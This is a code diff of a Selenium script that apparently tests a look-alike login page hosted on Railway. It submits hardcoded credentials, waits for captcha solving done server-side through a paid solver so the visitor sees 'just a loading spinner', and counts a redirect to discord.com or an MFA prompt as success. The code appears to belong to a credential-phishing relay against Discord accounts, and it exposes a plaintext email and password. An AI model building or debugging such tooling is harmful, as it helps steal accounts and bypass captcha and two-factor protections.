@@ -1,8 +1,9 @@
 """
-Selenium test: navigate to Railway site, enter credentials, submit login,
-wait for captcha iframe, and report status.
+Selenium test: enter credentials, submit, wait for server-side captcha solve.
+With capsolver API key set, captcha is solved server-side (10-60s).
+User will NOT see any captcha — just a loading spinner.
 """
-import time, sys, json
+import time
 from selenium import webdriver
 from selenium.webdriver.common.by import By
 from selenium.webdriver.chrome.service import Service
@@ -16,7 +17,7 @@ EMAIL = "fortbot7@inbox.lv"
 PASSWORD = "Fatman11$"
 
 def main():
-    print(f"[*] Setting up Chrome...")
+    print("[*] Setting up Chrome...")
     opts = Options()
     opts.add_argument("--disable-blink-features=AutomationControlled")
     opts.add_argument("--no-sandbox")
@@ -29,8 +30,7 @@ def main():
             service=Service(ChromeDriverManager().install()),
             options=opts
         )
-    except Exception as e:
-        print(f"[!] Chrome setup failed: {e}")
+    except Exception:
         driver = webdriver.Chrome(options=opts)
 
     driver.set_page_load_timeout(30)
@@ -39,97 +39,29 @@ def main():
         print(f"[*] Loading {URL}...")
         driver.get(URL)
         time.sleep(3)
-
         print(f"[*] Page title: {driver.title}")
 
-        # Enter credentials
         email_input = WebDriverWait(driver, 10).until(
             EC.presence_of_element_located((By.ID, "email"))
         )
         email_input.clear()
         email_input.send_keys(EMAIL)
-        print(f"[*] Entered email")
+        print("[*] Entered email")
 
         pw_input = driver.find_element(By.ID, "password")
         pw_input.clear()
         pw_input.send_keys(PASSWORD)
-        print(f"[*] Entered password")
+        print("[*] Entered password")
 
         login_btn = driver.find_element(By.ID, "login-btn")
         login_btn.click()
-        print(f"[*] Clicked Login button")
+        print("[*] Clicked Login — waiting for server-side captcha solve (up to 120s)...")
 
-        # Wait for captcha iframe (hcaptcha-frame) or other response
-        print(f"[*] Waiting for response (up to 30s)...")
-        captcha_found = False
-        for i in range(60):
-            time.sleep(0.5)
-            try:
-                frame = driver.find_element(By.ID, "hcaptcha-frame")
-                if frame.is_displayed():
-                    captcha_found = True
-                    print(f"\n[!] CAPTCHA IFRAME VISIBLE - user needs to solve it!")
-                    break
-            except:
-                pass
-
-            # Check for MFA
-            try:
-                mfa = driver.find_element(By.ID, "sec-mfa")
-                if mfa.is_displayed():
-                    print(f"\n[+] MFA SCREEN! Login succeeded, needs 2FA")
-                    return True
-            except:
-                pass
-
-            # Check for error
-            try:
-                err = driver.find_element(By.ID, "login-error")
-                if "show" in (err.get_attribute("class") or ""):
-                    print(f"\n[!] ERROR: {err.text}")
-                    return False
-            except:
-                pass
-
-            if i % 10 == 0:
-                print(f"    ...waiting ({i * 0.5}s)")
-
-        if not captcha_found:
-            print(f"[!] Captcha iframe never appeared. Dumping logs...")
-            dump_logs(driver)
-            return False
-
-        # === Captcha iframe is visible - wait for user to solve ===
-        print(f"[*] Waiting for user to solve captcha (up to 180s)...")
-        solved = False
-        for j in range(360):
+        # Server-side solving takes 10-60s. Wait for result.
+        for i in range(240):  # 120 seconds
             time.sleep(0.5)
 
-            # Check if iframe is gone (captcha solved -> iframe removed)
-            try:
-                frame = driver.find_element(By.ID, "hcaptcha-frame")
-                if not frame.is_displayed():
-                    print(f"[*] Captcha iframe hidden after {j * 0.5}s")
-                    solved = True
-                    break
-            except:
-                print(f"[*] Captcha iframe removed after {j * 0.5}s (solved!)")
-                solved = True
-                break
-
-            if j > 0 and j % 30 == 0:
-                print(f"    ...still waiting for captcha solve ({j * 0.5}s)")
-
-        if not solved:
-            print(f"[!] Captcha solve timed out")
-            dump_logs(driver)
-            return False
-
-        # === After captcha solved, wait for result ===
-        print(f"[*] Captcha solved. Waiting for post-captcha result (30s)...")
-        for k in range(60):
-            time.sleep(0.5)
-
+            # Success redirect
             try:
                 url = driver.current_url
                 if "discord.com" in url or "channels" in url:
@@ -138,39 +70,51 @@ def main():
             except:
                 pass
 
-            # Check for MFA
+            # MFA screen
             try:
                 mfa = driver.find_element(By.ID, "sec-mfa")
                 if mfa.is_displayed():
-                    print(f"\n[+] MFA SCREEN! Login succeeded, needs 2FA")
+                    print(f"\n[+] MFA SCREEN! Login worked, needs 2FA code")
                     return True
             except:
                 pass
 
-            # Check for error
+            # Error message
             try:
                 err = driver.find_element(By.ID, "login-error")
-                if "show" in (err.get_attribute("class") or ""):
+                cls = err.get_attribute("class") or ""
+                if "show" in cls:
                     print(f"\n[!] ERROR: {err.text}")
                     dump_logs(driver)
                     return False
             except:
                 pass
 
-            # Check if captcha came back (LOOP!)
+            # Captcha iframe appeared (fallback — shouldn't happen with API key)
             try:
                 frame = driver.find_element(By.ID, "hcaptcha-frame")
                 if frame.is_displayed():
-                    print(f"\n[!] CAPTCHA LOOPED AGAIN! Token was invalid.")
+                    print(f"\n[!] Captcha iframe appeared — server-side solve failed?")
                     dump_logs(driver)
                     return False
             except:
                 pass
 
-            if k % 10 == 0:
-                print(f"    ...waiting ({k * 0.5}s)")
+            # Button still loading = server is working
+            try:
+                btn = driver.find_element(By.ID, "login-btn")
+                if btn.get_attribute("disabled"):
+                    if i % 20 == 0:
+                        print(f"    ...server working ({i * 0.5}s)")
+                elif i > 10:
+                    # Button re-enabled without redirect/MFA/error = check final state
+                    print(f"[*] Button enabled after {i * 0.5}s")
+                    time.sleep(2)
+                    break
+            except:
+                pass
 
-        print(f"\n[*] Final state after 30s wait")
+        print(f"\n[*] Final URL: {driver.current_url}")
         dump_logs(driver)
 
     except Exception as e:
@@ -200,12 +144,12 @@ def dump_logs(driver):
             msg = log['message'][:600]
             level = log['level']
             lower = msg.lower()
-            if any(k in lower for k in ['captcha', 'debug', 'challenge', 'hcap', 'invalid', 'error', 'fail']):
+            if any(k in lower for k in ['captcha', 'debug', 'challenge', 'hcap', 'invalid', 'error', 'fail', 'success', 'mfa', 'token']):
                 print(f"  >>> [{level}] {msg}")
             elif level == 'SEVERE':
                 print(f"  [SEVERE] {msg}")
     except Exception as e:
-        print(f"[*] Could not get logs: {e}")
+        print(f"[*] Logs: {e}")
 
 
 if __name__ == "__main__":
